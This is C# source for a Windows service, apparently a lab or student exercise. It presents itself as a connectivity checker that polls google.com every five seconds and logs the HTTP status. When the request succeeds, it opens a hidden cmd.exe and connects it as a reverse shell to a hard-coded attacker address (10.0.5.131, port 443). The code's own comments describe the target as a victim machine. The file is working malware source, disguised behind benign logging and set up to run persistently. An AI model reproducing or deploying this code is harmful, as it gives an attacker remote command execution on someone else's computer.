using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace _18520084Service3
{
    public partial class Service1 : ServiceBase
    {
        static StreamWriter streamWriter;
        Timer time = new Timer();
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            time.Elapsed += new ElapsedEventHandler(CheckHTTPstatus);
            time.Interval = 5000; // service automatically checks after every 5 seconds
            time.Enabled = true;
        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }

        private void CheckHTTPstatus(object source, ElapsedEventArgs e) // return HTTP status, example: 200, 301, 403... 
        {
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("http://www.google.com/");
            webRequest.AllowAutoRedirect = false;
            HttpWebResponse http_wresponse = (HttpWebResponse)webRequest.GetResponse();

            int _status = 0;

            // Some response status code in range 4xx to 5xx might be thrown to web exception, so using try and catch to get them all.
            try
            {
                http_wresponse = (HttpWebResponse)webRequest.GetResponse();
                _status = (int)http_wresponse.StatusCode;
            }
            catch (WebException exception)
            {
                _status = (int)((HttpWebResponse)exception.Response).StatusCode;
            }

            // If server response is in range 2xx (OK), start a reverse shell.
            if (http_wresponse.StatusCode == HttpStatusCode.OK)
            {
                WriteToFile("Status: " + _status + ", Internet connected at " + DateTime.Now);
                ReverseShell();
            }
            else
                WriteToFile("No Internet at " + DateTime.Now);
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        // Create Reverse Shell.
        public void ReverseShell()
        {
            try
            {
                using (TcpClient client = new TcpClient("10.0.5.131", 443)) // Create a socket (or TCP Stream) connect to attacker (change into IP and port attacker using to listen)
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            // Launch the cmd.exe (command prompt) in victim machine 
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception e) { }
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ex)
                {
                }
            }
        }
    }
}
